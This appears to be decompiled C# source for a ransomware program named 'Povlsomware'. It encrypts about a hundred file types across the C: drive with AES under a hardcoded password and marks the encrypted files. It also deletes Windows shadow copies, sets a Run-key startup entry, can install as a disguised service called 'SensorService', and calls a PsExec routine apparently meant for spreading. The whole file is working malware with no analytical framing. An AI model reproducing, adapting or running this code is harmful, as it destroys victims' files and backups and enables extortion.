using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace TekstTV;

internal class Program
{
	public class Service : ServiceBase
	{
		public Service()
		{
			((ServiceBase)this).set_ServiceName("SensorService");
		}

		protected override void OnStart(string[] args)
		{
			Attack();
			DestroyCopy();
			SetStartup();
		}

		protected override void OnStop()
		{
			Application.Exit();
		}
	}

	public static int count = 0;

	public static List<string> encryptedFiles = new List<string>();

	private static char[] password = new char[13]
	{
		'3', '1', 'M', 'i', 'n', 'e', 's', 't', 'r', 'y',
		'g', 'e', 'r'
	};

	private static readonly string[] extensionsToEncrypt = new string[102]
	{
		"7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite",
		"sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd",
		"wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd",
		"vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf",
		"kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay",
		"bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif",
		"iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw",
		"orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf",
		"srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp",
		"asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf",
		"vob", "wmv"
	};

	private static void Main()
	{
		if (!Environment.UserInteractive)
		{
			Service service = new Service();
			try
			{
				ServiceBase.Run((ServiceBase)(object)service);
				return;
			}
			finally
			{
				((IDisposable)service)?.Dispose();
			}
		}
		Attack();
		DestroyCopy();
		SetStartup();
		PSExec.RunMe();
		CreateUI();
	}

	private static void SetStartup()
	{
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			flag = new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (!flag)
		{
			return;
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (registryKey.GetValue("Povlsomware") == null)
		{
			try
			{
				registryKey.SetValue("Povlsomware", "\"C:\\Windows\\system32\\Tasks\\Povlsomware.exe\"");
			}
			catch (Exception)
			{
			}
		}
	}

	public static char[] GetPass()
	{
		return password;
	}

	private static void CreateUI()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Visual());
	}

	public static void DecryptFile(string fileEncrypted, string password)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] array = AES_Decrypt(File.ReadAllBytes(fileEncrypted).Skip(4).ToArray(), bytes);
		FileStream fileStream = File.Open(fileEncrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileEncrypted, FileMode.Append);
		fileStream2.Write(array, 0, array.Length);
		Console.WriteLine("Decrypted: " + fileEncrypted);
	}

	public static void DestroyCopy()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		bool flag;
		using (WindowsIdentity ntIdentity = WindowsIdentity.GetCurrent())
		{
			flag = new WindowsPrincipal(ntIdentity).IsInRole(WindowsBuiltInRole.Administrator);
		}
		if (!flag)
		{
			return;
		}
		string text = "Win32_ShadowCopy";
		ManagementClass val = new ManagementClass("\\\\.\\ROOT\\cimv2" + ":" + text);
		try
		{
			ManagementObjectEnumerator enumerator = val.GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					((ManagementObject)enumerator.get_Current()).Delete();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine("Could not delete shadow copy if any " + ex.Message);
		}
	}

	public static void EncryptFile(string fileUnencrypted)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] array = AES_Encrypt(File.ReadAllBytes(fileUnencrypted), bytes);
		FileStream fileStream = File.Open(fileUnencrypted, FileMode.Open);
		fileStream.SetLength(0L);
		fileStream.Close();
		using FileStream fileStream2 = new FileStream(fileUnencrypted, FileMode.Append);
		if (fileStream2.CanWrite)
		{
			byte[] bytes2 = Encoding.UTF8.GetBytes("P0vL");
			fileStream2.Write(bytes2, 0, bytes2.Length);
			fileStream2.Write(array, 0, array.Length);
			Console.WriteLine("Encrypted: " + fileUnencrypted);
			count++;
			encryptedFiles.Add(fileUnencrypted);
		}
	}

	public static void Attack()
	{
		ProcessDirectory("C:\\", 1, "");
	}

	public static void UndoAttack(string decryption_password)
	{
		ProcessDirectory("C:\\", 0, decryption_password);
	}

	public static void ProcessDirectory(string targetDirectory, int action, string password)
	{
		foreach (string item in from file in Directory.EnumerateFiles(targetDirectory, "*.*")
			where extensionsToEncrypt.Any((string x) => file.EndsWith(x, StringComparison.OrdinalIgnoreCase))
			select file)
		{
			ProcessFile(item, action, password);
		}
		string[] directories = Directory.GetDirectories(targetDirectory);
		foreach (string text in directories)
		{
			try
			{
				if (!text.Contains("All Users\\Microsoft\\") && !text.Contains("$Recycle.Bin") && !text.Contains("C:\\Windows") && !text.Contains("C:\\Program Files") && !text.Contains("Temporary Internet Files") && !text.Contains("AppData\\") && !text.Contains("\\source\\") && !text.Contains("C:\\ProgramData\\") && !text.Contains("\\Povlsomware-master\\") && !text.Contains("\\Povlsomware\\"))
				{
					ProcessDirectory(text, action, password);
				}
			}
			catch
			{
			}
		}
	}

	public static bool IsMarked(string fileName)
	{
		byte[] bytes = Encoding.ASCII.GetBytes("P0vL");
		byte[] second = File.ReadAllBytes(fileName).Take(4).ToArray();
		if (bytes.SequenceEqual(second))
		{
			count++;
			encryptedFiles.Add(fileName);
			return true;
		}
		return false;
	}

	public static void ProcessFile(string fileName, int action, string password)
	{
		if (action == 1 && !IsMarked(fileName))
		{
			try
			{
				EncryptFile(fileName);
				return;
			}
			catch
			{
				return;
			}
		}
		if (action == 0 && IsMarked(fileName))
		{
			try
			{
				DecryptFile(fileName, password);
			}
			catch
			{
			}
		}
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}
}
